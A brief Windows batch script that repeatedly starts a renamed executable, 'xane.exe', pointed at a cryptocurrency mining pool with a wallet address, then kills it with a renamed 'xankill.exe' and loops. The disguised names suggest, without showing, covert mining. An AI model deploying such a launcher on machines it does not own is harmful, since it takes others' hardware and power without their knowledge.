:meem:
start xane.exe -pool stratum+tcp://172.65.200.133:3353 -wal 3Qyf229QddRmkrphHnKUCm4tfyXSQWLNwW -proto 4  -nvidia -gpus 0 -wdog 0 -gbase 0  -mport 127.0.0.1:-4000
timeout 450 /nobreak >nul 2>&1
xankill.exe -accepteula xane.exe
timout 1 /nobreak >nul 2>&1
goto meem